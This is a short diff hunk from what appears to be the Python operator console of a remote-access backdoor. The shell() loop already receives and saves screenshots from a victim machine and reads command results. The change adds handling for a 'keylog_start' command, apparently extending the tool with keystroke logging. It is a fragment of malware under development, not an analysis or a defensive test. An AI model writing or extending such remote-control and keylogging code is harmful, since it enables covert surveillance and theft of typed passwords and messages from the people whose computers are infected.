@@ -49,6 +49,8 @@ def shell():
                 else:
                     screen.write(image_decoded)
                     count = count + 1
+        elif command[:12] == "keylog_start":
+            continue
         else:
             result = reliable_recv()
             print(result)
